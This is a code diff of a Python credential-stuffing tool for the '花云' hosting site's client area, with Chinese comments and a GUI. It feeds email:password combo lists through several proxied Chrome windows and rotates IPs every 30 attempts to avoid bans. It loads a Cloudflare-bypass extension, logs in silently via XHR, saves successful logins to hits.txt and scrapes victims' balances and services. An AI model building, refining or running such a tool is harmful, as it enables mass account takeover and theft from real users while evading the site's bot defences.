@@ -1,15 +1,19 @@
 # -*- coding: utf-8 -*-
 """
 ============================================================
-  花云批量登录 - 多代理多窗口版 v3.0 (DrissionPage + XHR)
+  花云批量登录 - 多代理多窗口版 v4.0 (DrissionPage + CRX)
 ============================================================
+  核心修正:
+  - 插件格式: .crx 打包文件 (非文件夹)
+  - 加载方式: co.add_extension(path) (非 --load-extension)
+  - 插件和脚本在同一目录
+
   功能:
-  1. GUI选择过盾插件路径,自动加载到每个Chrome
-  2. 启动前验证: 插件加载成功 + 代理能打开花云页面
-  3. 代理预检测: 逐个验证能否访问花云,筛选可用代理
-  4. 每个IP跑30条后自动换下一个未用过的IP
-  5. 被ban时自动换IP+刷新过盾
-  6. combo队列分发,不重复不遗漏
+  1. 自动加载 cf-autoclick-master.crx 过盾插件
+  2. 多窗口并发 + 代理轮换 (每IP跑N条后换)
+  3. combo队列分发, 不重复不遗漏
+  4. 被ban自动换IP + 刷新过盾
+  5. XHR静默登录, 不刷新页面
 ============================================================
 """
 import sys
@@ -24,7 +28,7 @@ import gc
 try:
     from DrissionPage import ChromiumPage, ChromiumOptions
 except ImportError:
-    print("[!] pip install DrissionPage")
+    print("[!] 请安装 DrissionPage: pip install DrissionPage")
     sys.exit(1)
 
 try:
@@ -43,7 +47,9 @@ TARGET_PAGE = TARGET_BASE + "/clientarea.php"
 COMBO_FILE = "combo_f.txt"
 PROXY_FILE = "alive_proxies.txt"
 GOOD_FILE = "hits.txt"
-PROGRESS_FILE = "progress.txt"
+
+# 默认 crx 文件名 (与脚本同目录)
+DEFAULT_CRX = "cf-autoclick-master.crx"
 
 COMBO_PER_IP = 30
 DELAY_PER_REQ = 2.0
@@ -54,17 +60,39 @@ MAX_WORKERS = 3
 BASE_PORT = 9300
 
 
-
 # ============ 工具函数 ============
+def get_script_dir():
+    """获取脚本所在目录"""
+    return os.path.dirname(os.path.abspath(__file__))
+
+
+def find_crx_path(user_path=""):
+    """
+    查找 .crx 文件路径:
+    1. 如果用户指定了路径且文件存在, 用用户的
+    2. 否则在脚本同目录找默认 crx
+    """
+    if user_path and os.path.isfile(user_path) and user_path.endswith(".crx"):
+        return os.path.abspath(user_path)
+
+    default = os.path.join(get_script_dir(), DEFAULT_CRX)
+    if os.path.isfile(default):
+        return default
+
+    return ""
+
+
 def save_result(filename, content):
     with open(filename, "a", encoding="utf-8") as f:
         f.write(content + "\n")
+
 
 def page_is_ready(page):
     try:
         return len(page.html) > 10000
     except Exception:
         return False
+
 
 def is_banned(page):
     try:
@@ -77,6 +105,7 @@ def is_banned(page):
     except Exception:
         return False
 
+
 def has_login_form(page):
     try:
         return page.run_js(
@@ -86,11 +115,13 @@ def has_login_form(page):
     except Exception:
         return False
 
+
 def is_logged_in(page):
     try:
         return "logout.php" in page.html.lower()
     except Exception:
         return False
+
 
 def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
     start = time.time()
@@ -102,12 +133,14 @@ def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
         time.sleep(3)
     return page_is_ready(page)
 
+
 def logout_force(page):
     try:
         page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
     except Exception:
         pass
     time.sleep(0.5)
+
 
 def reload_form_silent(page):
     js = """
@@ -131,6 +164,7 @@ def reload_form_silent(page):
         return page.run_js(js) == "ok"
     except Exception:
         return False
+
 
 def do_login_xhr(page, email, password):
     js = """
@@ -173,22 +207,28 @@ def do_login_xhr(page, email, password):
     except Exception:
         return "js_error"
 
+
 def extract_info_from_html(html):
     info = {"balance": "unknown", "services": "0", "products": []}
     try:
         m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
-        if m: info["balance"] = m.group(1).strip()
+        if m:
+            info["balance"] = m.group(1).strip()
         m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
-        if m: info["services"] = m.group(1)
-        products = re.findall(r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
+        if m:
+            info["services"] = m.group(1)
+        products = re.findall(
+            r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
         for pid, pname in products:
             expire = "unknown"
             em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
-            if em: expire = em.group(1)
+            if em:
+                expire = em.group(1)
             info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
     except Exception:
         pass
     return info
+
 
 def format_info(info):
     parts = ["balance=" + info["balance"], "services=" + info["services"]]
@@ -199,11 +239,9 @@ def format_info(info):
 
 
 # ============================================================
-# 代理管理器 - 不重复不遗漏
+# 代理管理器 - 线程安全, 不重复不遗漏
 # ============================================================
 class ProxyManager:
-    """线程安全的代理管理: 每个代理只用一次,用完标记"""
-
     def __init__(self, proxies):
         self.all_proxies = list(proxies)
         self.available = queue.Queue()
@@ -237,7 +275,6 @@ class ProxyManager:
         return len(self.all_proxies)
 
 
-
 # ============================================================
 # 单窗口Worker
 # ============================================================
@@ -245,13 +282,13 @@ class WindowWorker:
     """独立窗口: 自己的Chrome+代理+Cookie, 从队列取combo"""
 
     def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
-                 stats, extension_path="", log_func=None):
+                 stats, crx_path="", log_func=None):
         self.worker_id = worker_id
         self.proxy_manager = proxy_manager
         self.combo_queue = combo_queue
         self.result_lock = result_lock
         self.stats = stats
-        self.extension_path = extension_path
+        self.crx_path = crx_path  # .crx 文件的完整路径
         self.log_func = log_func
         self.page = None
         self.port = BASE_PORT + worker_id
@@ -267,7 +304,11 @@ class WindowWorker:
             print(full, flush=True)
 
     def start_browser_with_proxy(self, proxy):
-        """启动Chrome: 加载过盾插件 + 设置代理"""
+        """
+        启动Chrome: 
+        - 用 co.add_extension(crx_path) 加载 .crx 插件 (关键!)
+        - 设置代理
+        """
         self.close_browser()
         self.current_proxy = proxy
         self.combo_count_on_ip = 0
@@ -283,13 +324,18 @@ class WindowWorker:
             co.set_argument('--disable-sync')
             co.set_argument('--disable-translate')
 
-            # 加载过盾插件 (关键: 只用 --load-extension, 不加任何disable-extensions参数)
-            if self.extension_path and os.path.isdir(self.extension_path):
-                co.set_argument(f'--load-extension={self.extension_path}')
+            # ============================================
+            # 关键: 加载 .crx 打包插件用 add_extension()
+            # 不是 --load-extension (那个是给未打包文件夹用的)
+            # ============================================
+            if self.crx_path and os.path.isfile(self.crx_path):
+                co.add_extension(self.crx_path)
+                self.log(f"已加载插件: {os.path.basename(self.crx_path)}")
 
             # 设置代理
             if proxy:
-                co.set_argument(f'--proxy-server={proxy.to_selenium_arg()}')
+                proxy_arg = proxy.to_selenium_arg()
+                co.set_argument(f'--proxy-server={proxy_arg}')
 
             self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url() if proxy else '直连'}")
             self.page = ChromiumPage(co)
@@ -330,7 +376,7 @@ class WindowWorker:
                 time.sleep(1)
 
             if has_login_form(self.page) or reload_form_silent(self.page):
-                self.log("页面就绪,可以开始登录 ✓")
+                self.log("页面就绪, 可以开始登录 ✓")
                 return True
 
             self.log("无法获取登录表单")
@@ -347,13 +393,11 @@ class WindowWorker:
             self.log("没有更多可用代理了!")
             return False
 
-        # 启动新浏览器
         if not self.start_browser_with_proxy(proxy):
-            return self.switch_to_next_ip()  # 递归尝试下一个
+            return self.switch_to_next_ip()
 
-        # 直接打开花云验证: 能过盾+看到登录表单 = IP有效
         if not self.init_page_and_verify():
-            self.log(f"代理 {proxy.to_url()} 无法访问花云,换下一个")
+            self.log(f"代理 {proxy.to_url()} 无法访问花云, 换下一个")
             self.close_browser()
             return self.switch_to_next_ip()
 
@@ -379,9 +423,8 @@ class WindowWorker:
 
     def run(self):
         """主循环"""
-        # 获取第一个代理并启动
         if not self.switch_to_next_ip():
-            self.log("无法获取可用代理,退出")
+            self.log("无法获取可用代理, 退出")
             return
 
         batch_count = 0
@@ -393,12 +436,12 @@ class WindowWorker:
             except queue.Empty:
                 break
 
-            # 检查是否需要换IP (每30条)
+            # 检查是否需要换IP (每N条)
             if self.combo_count_on_ip >= COMBO_PER_IP:
-                self.log(f"已跑{self.combo_count_on_ip}条,换新IP...")
+                self.log(f"已跑{self.combo_count_on_ip}条, 换新IP...")
                 if not self.switch_to_next_ip():
                     self.combo_queue.put((idx, email, password))
-                    self.log("无更多代理,退出")
+                    self.log("无更多代理, 退出")
                     break
 
             # 定期刷新token
@@ -479,16 +522,19 @@ class WindowWorker:
 # ============================================================
 class MultiWindowEngine:
     def __init__(self, proxies, combos, max_workers=MAX_WORKERS,
-                 extension_path="", log_func=None):
+                 crx_path="", log_func=None):
         self.proxy_manager = ProxyManager(proxies)
         self.combos = combos
         self.max_workers = max_workers
-        self.extension_path = extension_path
+        self.crx_path = crx_path
         self.log_func = log_func
 
         self.combo_queue = queue.Queue()
         self.result_lock = threading.Lock()
-        self.stats = {"processed": 0, "hits": 0, "failed": 0, "errors": 0, "bans": 0, "total": len(combos)}
+        self.stats = {
+            "processed": 0, "hits": 0, "failed": 0,
+            "errors": 0, "bans": 0, "total": len(combos)
+        }
         self.workers = []
         self.threads = []
         self.running = False
@@ -505,7 +551,9 @@ class MultiWindowEngine:
             self.combo_queue.put((i, email, password))
 
         self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {self.max_workers}")
-        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条 | 过盾插件: {'已设置' if self.extension_path else '未设置'}")
+        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条")
+        self.log(f"[引擎] 插件: {os.path.basename(self.crx_path) if self.crx_path else '未设置'}")
+        self.log(f"[引擎] 加载方式: co.add_extension() (CRX打包文件)")
 
         for wid in range(self.max_workers):
             worker = WindowWorker(
@@ -514,14 +562,14 @@ class MultiWindowEngine:
                 combo_queue=self.combo_queue,
                 result_lock=self.result_lock,
                 stats=self.stats,
-                extension_path=self.extension_path,
+                crx_path=self.crx_path,
                 log_func=self.log_func
             )
             self.workers.append(worker)
             t = threading.Thread(target=worker.run, daemon=True)
             self.threads.append(t)
             t.start()
-            time.sleep(5)  # 错开启动
+            time.sleep(5)  # 错开启动避免端口冲突
 
         threading.Thread(target=self._monitor, daemon=True).start()
 
@@ -549,7 +597,7 @@ if HAS_GUI:
     class FlowerLoginApp(ctk.CTk):
         def __init__(self):
             super().__init__()
-            self.title("花云批量登录 v3.0 - 多代理多窗口")
+            self.title("花云批量登录 v4.0 - CRX插件 + 多代理多窗口")
             self.geometry("1100x750")
             self.minsize(1000, 650)
             ctk.set_appearance_mode("dark")
@@ -561,13 +609,23 @@ if HAS_GUI:
             top = ctk.CTkFrame(self)
             top.pack(fill="x", padx=10, pady=(10, 5))
 
-            # Row 1: 过盾插件路径
+            # Row 1: CRX插件路径
             r0 = ctk.CTkFrame(top, fg_color="transparent")
             r0.pack(fill="x", padx=10, pady=4)
-            ctk.CTkLabel(r0, text="过盾插件路径:", font=("", 12, "bold")).pack(side="left")
-            self.ext_var = ctk.StringVar(value="")
-            ctk.CTkEntry(r0, textvariable=self.ext_var, width=500, placeholder_text="选择CloudflareBypass插件文件夹路径").pack(side="left", padx=5)
-            ctk.CTkButton(r0, text="选择文件夹", width=90, command=self._pick_ext).pack(side="left")
+            ctk.CTkLabel(r0, text="过盾插件(.crx):", font=("", 12, "bold")).pack(side="left")
+            # 自动检测同目录下的crx
+            default_crx = find_crx_path()
+            self.crx_var = ctk.StringVar(value=default_crx)
+            ctk.CTkEntry(r0, textvariable=self.crx_var, width=500,
+                         placeholder_text="选择 .crx 文件 (如 cf-autoclick-master.crx)").pack(side="left", padx=5)
+            ctk.CTkButton(r0, text="选择文件", width=90, command=self._pick_crx).pack(side="left")
+
+            if default_crx:
+                status_text = f"已自动检测到: {os.path.basename(default_crx)}"
+                status_color = "#00E676"
+            else:
+                status_text = "请选择 .crx 插件文件"
+                status_color = "#FFEB3B"
 
             # Row 2: 文件选择
             r1 = ctk.CTkFrame(top, fg_color="transparent")
@@ -598,7 +656,7 @@ if HAS_GUI:
             self.btn_start.pack(side="left", padx=5)
             self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
             self.btn_stop.pack(side="left", padx=5)
-            self.status_lbl = ctk.CTkLabel(r3, text="就绪 - 请先选择过盾插件路径", text_color="#FFEB3B", font=("", 12, "bold"))
+            self.status_lbl = ctk.CTkLabel(r3, text=status_text, text_color=status_color, font=("", 12, "bold"))
             self.status_lbl.pack(side="right", padx=10)
 
             # 统计
@@ -628,19 +686,28 @@ if HAS_GUI:
 
             self._refresh_stats()
 
-        def _pick_ext(self):
-            p = filedialog.askdirectory(title="选择过盾插件文件夹")
+        def _pick_crx(self):
+            """选择 .crx 文件 (不是文件夹!)"""
+            p = filedialog.askopenfilename(
+                title="选择过盾插件 .crx 文件",
+                filetypes=[("Chrome Extension", "*.crx"), ("All files", "*.*")]
+            )
             if p:
-                self.ext_var.set(p)
-                self.status_lbl.configure(text=f"插件路径已设置: {os.path.basename(p)}", text_color="#00E676")
+                self.crx_var.set(p)
+                self.status_lbl.configure(
+                    text=f"插件: {os.path.basename(p)}",
+                    text_color="#00E676"
+                )
 
         def _pick_proxy(self):
             p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
-            if p: self.proxy_var.set(p)
+            if p:
+                self.proxy_var.set(p)
 
         def _pick_combo(self):
             p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
-            if p: self.combo_var.set(p)
+            if p:
+                self.combo_var.set(p)
 
         def _log(self, msg):
             def _do():
@@ -660,56 +727,17 @@ if HAS_GUI:
                     self.pbar.set(s['processed'] / s['total'])
             self.after(1000, self._refresh_stats)
 
-        def _precheck(self):
-            """预检代理: 验证每个代理能打开花云"""
-            ext_path = self.ext_var.get()
-            if not ext_path:
-                messagebox.showwarning("提示", "请先选择过盾插件路径!")
-                return
-            proxies = load_proxies_from_file(self.proxy_var.get())
-            if not proxies:
-                messagebox.showwarning("提示", "代理文件为空!")
-                return
-
-            self._log(f"[预检] 开始验证 {len(proxies)} 个代理能否访问花云...")
-            self.btn_precheck.configure(state="disabled", text="检测中...")
-            self.status_lbl.configure(text="代理预检中...", text_color="#FFEB3B")
-
-            def run():
-                good = []
-                for i, proxy in enumerate(proxies):
-                    if not getattr(self, '_precheck_running', True):
-                        break
-                    self._log(f"  [{i+1}/{len(proxies)}] {proxy.to_url()}...", )
-                    ok = precheck_proxy_for_flowercloud(proxy, ext_path)
-                    if ok:
-                        good.append(proxy)
-                        self._log(f"    -> ✓ 可用")
-                    else:
-                        self._log(f"    -> ✗ 不可用")
-
-                # 保存可用代理
-                if good:
-                    with open("alive_proxies.txt", "w", encoding="utf-8") as f:
-                        for p in good:
-                            f.write(p.to_url() + "\n")
-                    self._log(f"[预检] 完成! {len(good)}/{len(proxies)} 可用, 已保存到 alive_proxies.txt")
-                else:
-                    self._log("[预检] 没有可用代理!")
-
-                def update():
-                    self.btn_precheck.configure(state="normal", text="预检代理")
-                    self.status_lbl.configure(text=f"预检完成: {len(good)}个可用", text_color="#00E676")
-                    # 不自动修改代理路径,让用户自己选
-                self.after(0, update)
-
-            self._precheck_running = True
-            threading.Thread(target=run, daemon=True).start()
-
         def _start(self):
-            ext_path = self.ext_var.get()
-            if not ext_path or not os.path.isdir(ext_path):
-                messagebox.showwarning("提示", "请先选择过盾插件文件夹路径!")
+            crx_path = self.crx_var.get().strip()
+            if not crx_path or not os.path.isfile(crx_path):
+                messagebox.showwarning("提示", "请选择有效的 .crx 插件文件!\n\n"
+                                       "确保 cf-autoclick-master.crx 在脚本同目录,\n"
+                                       "或手动选择 .crx 文件路径。")
+                return
+
+            if not crx_path.endswith(".crx"):
+                messagebox.showwarning("提示", "插件必须是 .crx 打包文件!\n"
+                                       "(不是文件夹, 不是 .zip)")
                 return
 
             proxies = load_proxies_from_file(self.proxy_var.get())
@@ -748,14 +776,14 @@ if HAS_GUI:
             workers = int(self.workers_var.get() or 3)
 
             self._log(f"[启动] 代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}")
-            self._log(f"[启动] 插件: {os.path.basename(ext_path)}")
-            self._log(f"[启动] 每窗口启动前会: 加载插件->验证页面->确认可用->才开始跑")
+            self._log(f"[启动] 插件: {os.path.basename(crx_path)}")
+            self._log(f"[启动] 加载方式: co.add_extension() <- CRX专用")
             self.status_lbl.configure(text="运行中...", text_color="#00E676")
             self.btn_start.configure(state="disabled")
 
             self.engine = MultiWindowEngine(
                 proxies=proxies, combos=combos, max_workers=workers,
-                extension_path=ext_path, log_func=self._log
+                crx_path=crx_path, log_func=self._log
             )
             threading.Thread(target=self.engine.start, daemon=True).start()
 
@@ -771,38 +799,82 @@ if HAS_GUI:
 # CLI模式
 # ============================================================
 def run_cli():
-    print("\n花云批量登录 - 多代理多窗口 CLI模式\n")
-    ext_path = input("过盾插件路径: ").strip()
-    if not os.path.isdir(ext_path):
-        print("[!] 插件路径无效")
+    print("\n" + "=" * 55)
+    print("  花云批量登录 v4.0 - CRX插件 + 多代理多窗口 CLI")
+    print("=" * 55)
+
+    # 自动查找同目录下的 crx
+    crx_path = find_crx_path()
+    if crx_path:
+        print(f"\n[*] 已自动检测到插件: {os.path.basename(crx_path)}")
+        use_default = input("    使用此插件? (Y/n): ").strip().lower()
+        if use_default == "n":
+            crx_path = input("    输入 .crx 文件路径: ").strip()
+    else:
+        crx_path = input("\n过盾插件 .crx 路径: ").strip()
+
+    if not crx_path or not os.path.isfile(crx_path):
+        print("[!] 插件文件不存在!")
+        print(f"    请确保 {DEFAULT_CRX} 在脚本同目录")
+        sys.exit(1)
+
+    if not crx_path.endswith(".crx"):
+        print("[!] 插件必须是 .crx 打包文件!")
         sys.exit(1)
 
     proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
     proxies = load_proxies_from_file(proxy_file)
     if not proxies:
-        print("[!] 无代理"); sys.exit(1)
+        print("[!] 无代理")
+        sys.exit(1)
 
     combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
     combos = []
-    with open(combo_file, "r", encoding="utf-8") as f:
-        for line in f:
-            line = line.strip()
-            if line and ":" in line:
-                parts = line.split(":", 1)
-                combos.append((parts[0].strip(), parts[1].strip()))
+    try:
+        content = None
+        for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
+            try:
+                with open(combo_file, "r", encoding=enc) as f:
+                    content = f.read()
+                break
+            except (UnicodeDecodeError, UnicodeError):
+                continue
+        if content:
+            for line in content.splitlines():
+                line = line.strip()
+                if line and ":" in line:
+                    parts = line.split(":", 1)
+                    combos.append((parts[0].strip(), parts[1].strip()))
+    except Exception as e:
+        print(f"[!] 加载combo失败: {e}")
+        sys.exit(1)
+
     if not combos:
-        print("[!] combo为空"); sys.exit(1)
+        print("[!] combo为空")
+        sys.exit(1)
 
     workers = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
-    print(f"\n代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}\n")
 
-    engine = MultiWindowEngine(proxies=proxies, combos=combos, max_workers=workers, extension_path=ext_path)
+    print(f"\n{'='*55}")
+    print(f"  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers}")
+    print(f"  插件: {os.path.basename(crx_path)}")
+    print(f"  加载: co.add_extension() (CRX专用方法)")
+    print(f"  每IP: {COMBO_PER_IP} 条后自动换")
+    print(f"{'='*55}\n")
+
+    engine = MultiWindowEngine(
+        proxies=proxies, combos=combos,
+        max_workers=workers, crx_path=crx_path
+    )
     engine.start()
     try:
         while engine.running:
             time.sleep(5)
             s = engine.stats
-            print(f"  [进度:{s['processed']}/{s['total']} 击中:{s['hits']} 失败:{s['failed']} 封:{s['bans']} 剩余代理:{engine.proxy_manager.remaining()}]")
+            remaining = engine.proxy_manager.remaining()
+            print(f"  [进度:{s['processed']}/{s['total']} "
+                  f"击中:{s['hits']} 失败:{s['failed']} "
+                  f"封:{s['bans']} 剩余代理:{remaining}]")
     except KeyboardInterrupt:
         engine.stop()
 
